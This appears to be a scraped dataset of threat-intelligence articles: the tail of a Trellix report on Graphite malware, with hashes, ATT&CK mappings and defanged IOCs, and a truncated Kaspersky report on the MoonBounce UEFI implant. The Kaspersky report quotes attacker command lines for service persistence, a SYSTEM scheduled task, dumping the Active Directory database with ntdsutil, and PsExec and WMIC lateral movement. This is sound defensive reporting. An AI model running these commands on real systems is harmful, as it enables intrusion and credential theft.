                "7bd11553409d635fe8ad72c5d1c56f77b6be55f1ace4f77f42f6bfb4408f4b3a",
                "Figure 3.",
                "Document metadata",
                "Figure 4.",
                "Remote link in OLE object",
                "Second Stage",
                "DLL Downloader",
                "File type",
                "File name",
                "fontsubc.dll",
                "File size",
                "88.50 KB",
                "Compilation time",
                "28/09/2021",
                "MD5",
                "81de02d6e6fca8e16f2914ebd2176b78",
                "SHA-256",
                "1ee602e9b6e4e58dfff0fb8606a41336723169f8d6b4b1b433372bf6573baf40",
                "Figure 5.",
                "Download of next stage malware",
                "Figure 6.",
                "Payload decryption and execution",
                "Figure 7.",
                "Malware magic value",
                "Third Stage",
                "Graphite Malware",
                "File type",
                "File name",
                "dfsvc.dll",
                "File size",
                "24.00 KB",
                "Compilation time",
                "20/09/2021",
                "MD5",
                "0ff09c344fc672880fdb03d429c7bda4",
                "SHA-256",
                "f229a8eb6f5285a1762677c38175c71dead77768f6f5a6ebc320679068293231",
                "Figure 8.",
                "Empire OneDrive stager API requests",
                "Figure 9.",
                "Graphite initializations",
                "Figure 10.",
                "Thread to monitor task results",
                "Figure 11.",
                "Request of new OAuth2 token",
                "Running processes",
                ".NET CLR version from PowerShell",
                "Windows OS version",
                "Figure 12.",
                "Graphite encoding data",
                "Figure 13.",
                "Graphite commands",
                "Figure 14.",
                "Decrypted operator task",
                "Figure 15.",
                "Graphite execution diagram",
                "File type",
                "File name",
                "csiresources.dll",
                "File size",
                "111.00 KB",
                "Compilation time",
                "21/09/2021",
                "MD5",
                "138122869fb47e3c1a0dfe66d4736f9b",
                "SHA-256",
                "25765faedcfee59ce3f5eb3540d70f99f124af4942f24f0666c1374b01b24bd9",
                "Figure 16.",
                "Process name check",
                "Figure 17.",
                "Loading EhStorShell.dll library",
                "Figure 18.",
                "Decryption of next stage malware",
                "File type",
                "File size",
                "34.00 KB",
                "MD5",
                "3b27fe7b346e3dabd08e618c9674e007",
                "SHA-256",
                "d5c81423a856e68ad5edaf410c5dfed783a0ea4770dbc8fb4943406c316a4317",
                "Figure 19.",
                "Fifth stage code",
                "File type",
                "Powershell script",
                "File size",
                "6.00 KB",
                "MD5",
                "a81fab5cf0c2a1c66e50184c38283e0e",
                "SHA-256",
                "da5a03bd74a271e4c5ef75ccdd065afe9bd1af749dbcff36ec7ce58bf7a7db37",
                "Figure 20.",
                "Obfuscated PowerShell script",
                "Timeline of Events",
                "Figure 21.",
                "Timeline of the campaign",
                "Targeting",
                "Figure 22.",
                "Infrastructure",
                "Figure 23.",
                "Reverse DNS query",
                "Figure 24.",
                "Attribution",
                "Figure 25.",
                "Adversary’s working days",
                "Figure 26.",
                "Adversary’s working hours",
                "Figure 28 Similar function flow",
                "Conclusion",
                "MITRE ATT&CK Techniques",
                "Tactic",
                "Resource Development",
                "T1583.001",
                "Acquire Infrastructure: Domains",
                "wordkeyvpload[.]net",
                "wordkeyvpload[.]org",
                "Resource Development",
                "T1587.001",
                "Develop capabilities: Malware",
                "Graphite malware",
                "Resource Development",
                "T1588.002",
                "Develop capabilities: Tool",
                "Empire",
                "Initial Access",
                "T1566.001",
                "Phishing: Spear phishing Attachment",
                "BM-D(2021)0247.xlsx",
                "Execution",
                "T1203",
                "Exploitation for Client Execution",
                "CVE-2021-40444",
                "Execution",
                "T1059.001",
                "Command and Scripting Interpreter: PowerShell",
                "Empire Powershell stager",
                "Persistence",
                "T1546.015",
                "CLSID: D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D",
                "Persistence",
                "T1136.001",
                "Create Account: Local Account",
                "net user /add user1",
                "Defense Evasion",
                "T1620",
                "Reflective Code Loading",
                "Empire DLL Launcher stager",
                "Command and Control",
                "T1104",
                "Multi-Stage Channels",
                "Use of different Empire stagers",
                "Command and Control",
                "T1102.002",
                "Web Service: Bidirectional Communication",
                "Microsoft OneDrive",
                "Empire Server",
                "Command and Control",
                "T1573.001",
                "Encrypted Channel: Symmetric Cryptography",
                "AES 256",
                "Command and Control",
                "T1573.002",
                "Encrypted Channel: Asymmetric Cryptography",
                "RSA",
                "Indicators of Compromise (IOCs)",
                "First stage",
                "Excel Downloaders",
                "40d56f10a54bd8031191638e7df74753315e76f198192b6e3965d182136fc2fa",
                "f007020c74daa0645b181b7b604181613b68d195bd585afd71c3cd5160fb8fc4",
                "7bd11553409d635fe8ad72c5d1c56f77b6be55f1ace4f77f42f6bfb4408f4b3a",
                "9052568af4c2e9935c837c9bdcffc79183862df083b58aae167a480bd3892ad0",
                "Second stage",
                "Downloader DLL",
                "1ee602e9b6e4e58dfff0fb8606a41336723169f8d6b4b1b433372bf6573baf40",
                "Third stage",
                "Graphite",
                "35f2a4d11264e7729eaf7a7e002de0799d0981057187793c0ba93f636126135f",
                "f229a8eb6f5285a1762677c38175c71dead77768f6f5a6ebc320679068293231",
                "25765faedcfee59ce3f5eb3540d70f99f124af4942f24f0666c1374b01b24bd9",
                "d5c81423a856e68ad5edaf410c5dfed783a0ea4770dbc8fb4943406c316a4317",
                "da5a03bd74a271e4c5ef75ccdd065afe9bd1af749dbcff36ec7ce58bf7a7db37",
                "URLs",
                "hxxps://wordkeyvpload[.]net/keys/Missions Budget Lb.xls",
                "hxxps://wordkeyvpload[.]net/keys/parliament_rew.xls",
                "hxxps://wordkeyvpload[.]net/keys/Missions Budget.xls",
                "hxxps://wordkeyvpload[.]net/keys/TR_comparison.xls",
                "hxxps://wordkeyvpload[.]net/keys/JjnJq3.html",
                "hxxps://wordkeyvpload[.]net/keys/iz7hfD.html",
                "hxxps://wordkeyvpload[.]net/keys/Ari2Rc.html",
                "hxxps://wordkeyvpload[.]net/keys/OD4cNq.html",
                "hxxps://wordkeyvpload[.]net/keys/0YOL4.cab",
                "hxxps://wordkeyvpload[.]net/keys/whmel.cab",
                "hxxps://wordkeyvpload[.]net/keys/UdOpQ.cab",
                "hxxps://wordkeyvpload[.]net/keys/D9V5E.cab",
                "hxxps://wordkeyvpload[.]net/keys/update.dat",
                "hxxps://wordkeyvpload[.]org/index.jsp",
                "hxxps://wordkeyvpload[.]org/index.php",
                "hxxps://wordkeyvpload[.]org/news.php",
                "hxxps://wordkeyvpload[.]org/admin/get.php",
                "hxxps://wordkeyvpload[.]org/login/process.php",
                "Domains",
                "wordkeyvpload[.]net",
                "wordkeyvpload[.]org",
                "jimbeam[.]live",
                "IPs",
                "131.153.96[.]114",
                "185.117.88[.]19",
                "94.140.112[.]178",
                "RECENT NEWS",
                "Feb 8, 2022",
                "Trellix Announces Executive Leadership Appointments",
                "Jan 31, 2022",
                "Jan 19, 2022",
                "Dec 2, 2021",
                "Oct 27, 2021",
                "RECENT STORIES",
                "Featured Content",
                "PERSPECTIVES",
                "Our CEO On Living Security",
                "Read More",
                "XDR",
                "Read More",
                "THREAT LABS",
                "2022 Threat Predictions",
                "Read More",
                "Get the latest",
                "We’re no strangers to cybersecurity.",
                "Submit",
                "Zero spam.",
                "Unsubscribe at any time.",
                "Privacy",
                "Legal",
                "Terms of Service",
                "Contact Us",
                "You're exiting Trellix.",
                "You're exiting Trellix."
            ],
            "wordsNum": 562,
            "labels": [
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                ""
            ]
        },
        {
            "time": "2022-01-20",
            "from_website": "Kaspersky",
            "title": "MoonBounce: the dark side of UEFI firmware",
            "from_url": "https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/",
            "content": [
                "MoonBounce: the dark side of UEFI firmware | Securelist",
                "Internet of Things & Embedded SecurityLearn More",
                "KasperskyEndpoint Detection and Response (EDR)Learn More",
                "Kaspersky Hybrid Cloud Security for AWS",
                "Kaspersky Hybrid Cloud Security for Azure",
                "KasperskyPhysical, Virtual & Cloud Workloads Security",
                "Internet of Things & Embedded Security",
                "MoonBounce: the dark side of UEFI firmware",
                "What happened?Revisiting the current state of the art in persistent attacksOur discovery: a sophisticated implant within UEFI firmwareOther pieces of malware on the radarWho were the targets?What were the attackers trying to achieve?Network infrastructureWho is behind the MoonBounce attack?ConclusionMoonBounce’ indicators of compromise",
                "At the end of 2021, we were made aware of a UEFI firmware-level compromise through logs from our Firmware Scanner, which has been integrated into Kaspersky products since the beginning of 2019.",
                "Further analysis has shown that a single component within the inspected firmware’s image was modified by attackers in a way that allowed them to intercept the original execution flow of the machine’s boot sequence and introduce a sophisticated infection chain.",
                "By examining the components of the rogue firmware and other malicious artefacts from the target’s network, we were able to reach the following conclusions:",
                "The inspected UEFI firmware was tampered with to embed a malicious code that we dub MoonBounce;",
                "Due to its emplacement on SPI flash which is located on the motherboard instead of the hard disk, the implant is capable of persisting in the system across disk formatting or replacement;",
                "The purpose of the implant is to facilitate the deployment of user-mode malware that stages execution of further payloads downloaded from the internet;",
                "The infection chain itself does not leave any traces on the hard drive, as its components operate in memory only, thus facilitating a fileless attack with a small footprint;",
                "We detected other non-UEFI implants in the targeted network that communicated with the same infrastructure which hosted the the stager’s payload;",
                "By assessing the combination of the above findings with network infrastructure fingerprints and other TTPs exhibited by the the attackers; to the best of our knowledge the intrusion set in question can be attributed to APT41, a threat actor that’s been widely reported to be Chinese-speaking;",
                "In this report we describe in detail how the MoonBounce implant works, how it is connected to APT41, and what other traces of activity related to Chinese-speaking actors we were able to observe in the compromised network that could indicate a connection to this threat actor and the underlying campaign.",
                "Revisiting the current state of the art in persistent attacks",
                "In the last year, there have been several public accounts on the ongoing trend of UEFI threats.",
                "Notable examples include the UEFI bootkit used as part of the FinSpy surveillance toolset that we reported on, the work of our colleagues from ESET on the ESPectre bootkit, and a little-known threat activity that was discovered within government organisations in the Middle East, using a UEFI bootkit of its own (briefly mentioned in our APT trends report Q3 2021 and covered in more detail in a private APT report delivered to customers of our Threat Intelligence Portal).",
                "The common denominator of those three cases is the fact that the UEFI components targeted for infection reside on the ESP (EFI System Partition), a storage space designated for some UEFI components, typically based in the computer’s hard drive or SSD.",
                "The most notable elements of the ESP are the Boot Manager and OS loader, both invoked during the machine’s boot sequence and which also happen to be the subject of tampering in the case of the aforementioned bootkits.",
                "While all of the above were seen in use by advanced actors, a different class of bootkits raises even higher concern.",
                "This one is made up of implants found in the UEFI firmware within the SPI flash, a non-volatile storage external to the hard drive.",
                "Such bootkits are not only stealthier (partially because of limited visibility by security products into this hardware component), but also more difficult to mitigate: flashing a clean firmware image in place of a malicious one can prove to be more difficult than formatting a hard drive and reinstalling an OS, which would typically eliminate ESP level threats.",
                "MoonBounce is notable for being the third publicly revealed case of an implant from the latter class of firmware-based rootkits.",
                "Previous cases included LoJax and MosaicRegressor, which we reported on during October 2020.",
                "In that sense, MoonBounce marks a particular evolution in this group of threats by presenting a more complicated attack flow in comparison to its predecessors and a higher level of technical competence by its authors, who demonstrate a thorough understanding of the finer details involved in the UEFI boot process.",
                "Our discovery: a sophisticated implant within UEFI firmware",
                "The UEFI implant, which was detected in spring 2021 , was found to have been incorporated by the attackers into the CORE_DXE component of the firmware (also known as the DXE Foundation), which is called early on at the DXE (Driver Execution Environment) phase of the UEFI boot sequence.",
                "Among other things, this component is responsible for initializing essential data structures and function interfaces, one of which is the EFI Boot Services Table",
                "a set of pointers to routines that are part of the CORE_DXE image itself and are callable by other DXE drivers in the boot chain.",
                "The source of the infection starts with a set of hooks that intercept the execution of several functions in the EFI Boot Services Table, namely AllocatePool, CreateEventEx and ExitBootServices.",
                "Those hooks are used to divert the flow of these functions to malicious shellcode that is appended by the attackers to the CORE_DXE image, which in turn sets up additional hooks in subsequent components of the boot chain, namely the Windows loader.",
                "This multistage chain of hooks facilitates the propagation of malicious code from the CORE_DXE image to other boot components during system startup, allowing the introduction of a malicious driver to the memory address space of the Windows kernel.",
                "This driver, which runs during the initial phases of the kernel’s execution, is in charge of deploying user-mode malware by injecting it into an svchost.exe process, once the operating system is up and running.",
                "Finally, the user mode malware reaches out to a hardcoded C&C URL (i.e.",
                "hxxp://mb.glbaitech[.]com/mboard.dll) and attempts to fetch another stage of the payload to run in memory, which we were not able to retrieve.",
                "The diagram below contains the outline of the stages taken from the moment the hooked Boot Services are called in the context of the DXE Foundation’s execution until the user-mode malware is deployed and run during the Operating System’s execution.",
                "The full description of each step in the diagram, along with the analysis of both the MoonBounce driver and user-mode malware can be found in the technical document released alongside this report.",
                "Flow of MoonBounce execution from boot sequence to malware deployment in user space",
                "Note that at the time of writing we lack sufficient evidence to retrace how the UEFI firmware was infected in the first place.",
                "The infection itself, however, is assumed to have occurred remotely.",
                "While previous UEFI firmware compromises (i.e.",
                "LoJax and MosaicRegressor) manifested as additions of DXE drivers to the overall firmware image on the SPI flash, the current case exhibits a much more subtle and stealthy technique where an existing firmware component is modified to alter its behaviour.",
                "Notably, particular functions were modified with an inline hook, meaning the replacement of the function prologue with an instruction to divert execution to a function chosen by the attacker.",
                "This form of binary instrumentation typically requires the attacker to obtain the original image, then parse and change it to introduce malicious logic.",
                "This would be possible for an attacker having ongoing and remote access to the targeted machine.",
                "Other pieces of malware on the radar",
                "In addition to MoonBounce, we found infections across multiple nodes in the same network by a known user-mode malware dubbed ScrambleCross, also known as SideWalk.",
                "This is an in-memory implant, implemented as position-independent code, that can communicate to a C2 server in order to exchange information and stage the execution of additional plugins in memory, of which none has been sighted in the wild yet.",
                "This malware was thoroughly covered by our colleagues at Trend Micro and ESET, so we will refer the reader to their excellent write-ups to understand its internals better.",
                "The position-independent code constituting ScrambleCross can be loaded in one of two ways, the first being a C++ DLL named StealthVector.",
                "It obtains the ScrambleCross shellcode by applying a modified ChaCha20 algorithm on an encrypted blob, which may reside as an additional file on disk or be embedded in the loader itself.",
                "We detected both variants of this loader in the network in question.",
                "StealthVector gets loaded through the introduction of a modified benign system DLL, in which the import address table is patched to append the malware’s DLL as a dependency.",
                "In one case, we observed such altered wbemcomn.dll (MD5: C3B153347AED27435A18E789D8B67E0A) file, which originally facilitates the functionality of WMI in Windows and was located in the directory %SYSTEM%\\wbem.",
                "As a consequence, when the WMI service was initiated, the rogue version of this DLL forced the loading of a StealthVector image named wmiwk.dll.",
                "Appended IAT entry to a rogue wbemcomn.dll file which forces the loading of StealthVector upon initiation of the WMI service",
                "The table below specifies all instances of StealthVector that we detected in the targeted network, along with timestamp artefacts that might point to the date of their creation.",
                "Another loader that we detected and is commonly used to load ScrambleCross is .NET based, referred to as StealthMutant.",
                "It works by decrypting a shellcode BLOB with AES-256 and injecting it to the address space of another process.",
                "The injected process in every case we observed was msdt.exe (Microsoft Diagnostic Troubleshooting Wizard).",
                "StealthMutant is launched in one of two ways, which were partially described in other reports as well.",
                "The first way is by executing a launcher utility with the filename System.Mail.Service.dll (MD5: 5F9020983A61446A77AF1976247C443D) through the command line as a service.",
                "This is outlined in the following commands typed by the attackers on one of the compromised systems:",
                "reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v \"iscsiwmi\" /t REG_MULTI_SZ /d \"iscsiwmi\" /f",
                "sc  create \"iscsiwmi\" binPath= \"$system32\\svchost.exe -k iscsiwmi\" type= share start= auto error= ignore DisplayName= \"iscsiwmi\"",
                "SC  failure \"iscsiwmi\" reset= 86400 actions= restart/60000/restart/60000/restart/60000",
                "sc  description \"iscsiwmi\" \"\"iSCSI WMI Classes That Manage Initiators, Ports, Sessions and Connections\"\"",
                "reg  add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\iscsiwmi\\Parameters\" /v \"ServiceDll\" /t REG_EXPAND_SZ /d \"$windir\\Microsoft.NET\\Framework64\\v4.0.30319\\System.Mail.Service.dll\" /f",
                "net  start \"iscsiwmi\"sc  stop iscsiwmisc  delete iscsiwmireg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v \"iscsiwmi\" /t REG_MULTI_SZ /d \"iscsiwmi\" /fsc  create \"iscsiwmi\" binPath= \"$system32\\svchost.exe -k iscsiwmi\" type= share start= auto error= ignore DisplayName= \"iscsiwmi\"SC  failure \"iscsiwmi\" reset= 86400 actions= restart/60000/restart/60000/restart/60000sc  description \"iscsiwmi\" \"\"iSCSI WMI Classes That Manage Initiators, Ports, Sessions and Connections\"\"reg  add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\iscsiwmi\\Parameters\" /freg  add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\iscsiwmi\\Parameters\" /v \"ServiceDll\" /t REG_EXPAND_SZ /d \"$windir\\Microsoft.NET\\Framework64\\v4.0.30319\\System.Mail.Service.dll\" /fnet  start \"iscsiwmi\"",
                "The launching utility in turn uses the .NET InstallUtil.exe application in order to execute the StealthMutant image, which has the filename Microsoft.Service.Watch.targets, and providing it with the encrypted ScrambleCross shellcode as an argument from a file named MstUtil.exe.config.",
                "The utility itself is a basic C++ program that achieves the aforementioned goal by issuing the following command line using the WinExec API:",
                "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /ConfigFile=MstUtil.exe.config /U C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Service.Watch.targets",
                "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /ConfigFile=MstUtil.exe.config /U C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Service.Watch.targets",
                "The second way to execute StealthMutant is through the creation of a scheduled task via a Windows batch script file named schtask.bat, as outlined below:",
                "schtasks /create /TN \"\\Microsoft\\Windows\\UNP\\UNPRefreshListTask\" /SC ONSTART /TR \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /ConfigFile=MstUtil.exe.config /U C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Service.Watch.targets\" /F  /DELAY 0000:02 /RU SYSTEM /RL HIGHEST",
                "@echo offcd /d \"%~dp0\"copy /Y Microsoft.Service.Watch.targets \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Service.Watch.targets\"copy /Y MstUtil.exe.config \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MstUtil.exe.config\"schtasks /create /TN \"\\Microsoft\\Windows\\UNP\\UNPRefreshListTask\" /SC ONSTART /TR \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /ConfigFile=MstUtil.exe.config /U C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Service.Watch.targets\" /F  /DELAY 0000:02 /RU SYSTEM /RL HIGHESTschtasks /run /TN \"\\Microsoft\\Windows\\UNP\\UNPRefreshListTask\"",
                "The following table lists known StealthMutant loader IOCs, together with their corresponding ScrambleCross shellcode files and contacted C2 addresses.",
                "It’s worth noting that most of the ScrambleCross shellcodes (loaded by both StealthMutant and StealthVector) reached out to the same server (i.e.",
                "ns.glbaitech[.]com) and that StealthMutant was observed in this campaign only from February, 2021.",
                "In addition to the above components, we found other stagers and post-exploitation malware implants during our research, some of which were attributed to or have been used by known Chinese-speaking threat actors:",
                "Microcin: a backdoor typically used by the SixLittleMonkeys threat actor, which we have been tracking since 2016.",
                "It is worth noting that since its inception, the SixLittleMonkeys group has been using Microcin against various targets, partly against high-profile entities based in Russia and Central Asia.",
                "The implants we observed in this campaign are shipped as DLLs that ought to run in the context of exe, with the primary intent of reading a C2 address from an encrypted configuration file stored in %WINDIR%\\debug\\netlogon.cfg and reaching out to the server to obtain a further payload.",
                "Interestingly, the Trojan holds a scheduling algorithm that would skip any work on Saturdays, checking the local time every hour to determine if Saturday has passed.",
                "Mimikat_ssp: a publicly available post-exploitation tool used to dump credentials and security secrets from exe, also used widely by various Chinese-speaking actors (e.g.",
                "Go implant: a formerly unknown backdoor used to contact a C2 server using a RESTful API, where a combination of a hardcoded IP address and a hypermedia directory path on the underlying server are used for information exchange.",
                "Both the IP and the server directory path are encrypted with AES-128 using a base64 encoded key stored in the backdoor’s image.",
                "The IP and directory path tuple are used during execution for:",
                "Sending information from the infected host;",
                "Requesting a specific server path containing a command for execution and downloading it;",
                "Sending back the result of the command’s execution to the C2 server.",
                "The commands retrieved from the server are also encrypted with AES-128, with the key stored in the command’s file itself.",
                "Command execution results are then encrypted using the same key.",
                "We found the following list of supported commands:",
                "Get content list from a specified directory;",
                "Download a file from the C2 server;",
                "Write text to a given *.bat file and execute it;",
                "It is important to note that we could not conclusively tie most of those additional pieces of malware to the intrusion set related to MoonBounce, with the exception of Microcin, where some timeline artefacts coincide with other events related to ScrambleCross, as outlined in the figure below.",
                "This suggests a low-confidence connection between Microcin and MoonBounce and may indicate usage of shared resources between SixLittleMonkeys and APT41 or involvement of the former’s operators in the MoonBounce activity.",
                "Timeline of events related to artefacts found in the network containing the MoonBounce-infected machine",
                "Currently, our detections indicate a very targeted nature of the attack",
                "the presence of the firmware rootkit was detected in a single case.",
                "ScrambleCross and its loaders) were found on multiple other machines in the same network range.",
                "In addition, we found several other victims of an undetermined nature with the same versions of ScrambleCross reaching out to the same command and control infrastructure.",
                "One particular target corresponds to an organization in control of several enterprises dealing with transport technology.",
                "What were the attackers trying to achieve?",
                "We traced some of the commands executed by the attackers after gaining a foothold in the network, which point to lateral movement and exfiltration of information from particular machines.",
                "This aligns in profile with some of the previous operations by APT41, wherein intrusions were typically made to intervene in the targeted companies’ supply chain, or to heist sensitive intellectual property and personally identifiable information.",
                "The usage of the UEFI implant in particular indicates the actor’s aim to establish a longstanding foothold within the network, as would be expected in an ongoing espionage activity.",
                "The following are examples of command lines that portray some of the methods and actions taken by the operators of this threat activity to achieve their goals:",
                "Attempts to enumerate hosts and gather network information:",
                "cmd /C \"C: & cd \\ & whoami\"",
                "cmd /C \"C: & cd \\ & net view\"",
                "cmd /C \"C: & cd \\ & -setcp 866\"",
                "cmd /C \"C: & cd \\ & net view\"",
                "cmd /C \"C: & cd \\ & netstat -ano\"",
                "cmd /C \"C: & cd \\ & dir $temp\\ /od\"",
                "cmd /C \"C: & cd \\ & arp -a\"",
                "cmd /C \"C: & cd \\ & tasklist\"",
                "cmd /C \"C: & cd \\ & tracert <redacted_internal_ip>\"",
                "cmd /C \"C: & cd \\ & net use \\\\<redacted_internal_ip> /u:<redacted_username> <redacted_password>\"",
                "cmd /C \"C: & cd \\ & net view \\\\<redacted_internal_ip>\"",
                "cmd /C \"C: & cd \\ & ping -n 1 -a <redacted_internal_ip>\"",
                "cmd /C \"C: & cd \\ & net use * /d /y\"",
                "cmd /C \"C: & cd \\ & systeminfo\"",
                "cmd /C \"C: & cd \\ & whoami\"cmd /C \"C: & cd \\ & net view\"cmd /C \"C: & cd \\ & -setcp 866\"cmd /C \"C: & cd \\ & net view\"cmd /C \"C: & cd \\ & netstat -ano\"cmd /C \"C: & cd \\ & dir $temp\\ /od\"cmd /C \"C: & cd \\ & arp -a\"cmd /C \"C: & cd \\ & tasklist\"cmd /C \"C: & cd \\ & tracert <redacted_internal_ip>\"cmd /C \"C: & cd \\ & net use \\\\<redacted_internal_ip> /u:<redacted_username> <redacted_password>\"cmd /C \"C: & cd \\ & net view \\\\<redacted_internal_ip>\"cmd /C \"C: & cd \\ & ping -n 1 -a <redacted_internal_ip>\"cmd /C \"C: & cd \\ & net use * /d /y\"cmd /C \"C: & cd \\ & systeminfo\"",
                "Copying of files across SMB shares, followed by an attempt to dump the Active Directory domain database (tid):",
                "cmd /C \"C: & cd \\ & echo ntdsutil \\\"ac i ntds\\\" \\\"ifm\\\" \\\"create full $temp\\1\\\\\\\" q q >$temp\\a.bat",
                "cmd /C \"C: & cd \\ & type $temp\\a.bat",
                "cmd /C \"C: & cd \\ & move $temp\\a.bat \\\\<redacted_internal_ip>\\c$\\windows\\temp\\\\",
                "cmd /C \"C: & cd \\ & echo ntdsutil \\\"ac i ntds\\\" \\\"ifm\\\" \\\"create full $temp\\1\\\\\\\" q q >$temp\\a.batcmd /C \"C: & cd \\ & type $temp\\a.batcmd /C \"C: & cd \\ & move $temp\\a.bat \\\\<redacted_internal_ip>\\c$\\windows\\temp\\\\",
                "Usage of the Sysinternals Psexec tool for remote command execution in the network (as the renamed version tmp):",
                "$temp\\TS_P61S.tmp  -accepteula -d -s \\\\<redacted_internal_ip1>\\ cmd /c \"arp -a >$temp\\TS_P34H.tmp\"",
                "$temp\\TS_P61S.tmp  -accepteula -d -s \\\\<redacted_internal_ip2>\\ cmd /c \"ping <redacted_internal_ip2> -a -n 2>$temp\\TS_P34H.tmp\"",
                "$temp\\TS_P61S.tmp  -accepteula -d -s \\\\<redacted_internal_ip3>\\ cmd /c \"ping -n 2 -a <redacted_internal_ip2>>$temp\\TS_P34H.tmp\"",
                "$temp\\TS_P61S.tmp  -accepteula -d -s \\\\<redacted_internal_ip1>\\ cmd /c \"arp -a >$temp\\TS_P34H.tmp\"$temp\\TS_P61S.tmp  -accepteula -d -s \\\\<redacted_internal_ip2>\\ cmd /c \"ping <redacted_internal_ip2> -a -n 2>$temp\\TS_P34H.tmp\"$temp\\TS_P61S.tmp  -accepteula -d -s \\\\<redacted_internal_ip3>\\ cmd /c \"ping -n 2 -a <redacted_internal_ip2>>$temp\\TS_P34H.tmp\"",
                "Usage of WMI for remote command execution:",
                "wmic  /node:<redacted_internal_ip1> /user:<redacted_group>\\<redacted_user> /password:<readcted_password> process call create \"cmd /c ping -n 1 -a <redacted_internal_ip4> >$temp\\a.tmp",
                "wmic  /node:<redacted_internal_ip2> /user:<redacted_group>\\<redacted_user> /password:<readcted_password> process call create \"cmd /c netstat -ano >$temp\\a.tmp",
                "wmic  /node:<redacted_internal_ip2> /user:<redacted_group>\\<redacted_user> /password:<readcted_password> process call create \"cmd /c tracert <redacted_internal_ip4>>$temp\\a.tmp",
                "wmic  /node:<redacted_internal_ip3> /user:<redacted_group>\\<redacted_user> /password:<readcted_password> process call create \"cmd /c ipconfig /all >$temp\\a.tmp",
                "wmic  /node:<redacted_internal_ip3> /user:<redacted_group>\\<redacted_user> /password:<readcted_password> process call create \"cmd /c qwinsta >$temp\\a.tmp",
                "wmic  /node:<redacted_internal_ip3> /user:<redacted_group>\\<redacted_user> /password:<readcted_password> process call create \"cmd /c net user administrator >$temp\\a.tmp",
                "wmic  /node:<redacted_internal_ip3> /user:<redacted_group>\\<redacted_user> /password:<readcted_password> process call create \"cmd /c net user admin >$temp\\a.tmp",
                "wmic  /node:<redacted_internal_ip1> /user:<redacted_group>\\<redacted_user> /password:<readcted_password> process call create \"cmd /c ping -n 1 -a <redacted_internal_ip4> >$temp\\a.tmpwmic  /node:<redacted_internal_ip2> /user:<redacted_group>\\<redacted_user> /password:<readcted_password> process call create \"cmd /c netstat -ano >$temp\\a.tmpwmic  /node:<redacted_internal_ip2> /user:<redacted_group>\\<redacted_user> /password:<readcted_password> process call create \"cmd /c tracert <redacted_internal_ip4>>$temp\\a.tmpwmic  /node:<redacted_internal_ip3> /user:<redacted_group>\\<redacted_user> /password:<readcted_password> process call create \"cmd /c ipconfig /all >$temp\\a.tmpwmic  /node:<redacted_internal_ip3> /user:<redacted_group>\\<redacted_user> /password:<readcted_password> process call create \"cmd /c qwinsta >$temp\\a.tmpwmic  /node:<redacted_internal_ip3> /user:<redacted_group>\\<redacted_user> /password:<readcted_password> process call create \"cmd /c net user administrator >$temp\\a.tmpwmic  /node:<redacted_internal_ip3> /user:<redacted_group>\\<redacted_user> /password:<readcted_password> process call create \"cmd /c net user admin >$temp\\a.tmp",
                "Removal of artefacts from the system:",
                "cmd /C \"C: & cd \\ & dir $temp\\ /od\"",
                "cmd /C \"C: & cd \\ & dir $temp\\*.hive\"",
                "cmd /C \"C: & cd \\ & del $temp\\*.hive\"",
                "cmd /C \"C: & cd \\ & dir $temp\\*.log\"",
                "cmd /C \"C: & cd \\ & type $temp\\silconfig.log\"",
                "cmd /C \"C: & cd \\ & dir $temp\\ /od\"cmd /C \"C: & cd \\ & dir $temp\\*.hive\"cmd /C \"C: & cd \\ & del $temp\\*.hive\"cmd /C \"C: & cd \\ & dir $temp\\*.log\"cmd /C \"C: & cd \\ & type $temp\\silconfig.log\"",
                "File archiving of remotely collected files, some of which contain *.hive files, possibly for LSA secrets dumping, with the exe command line utility:",
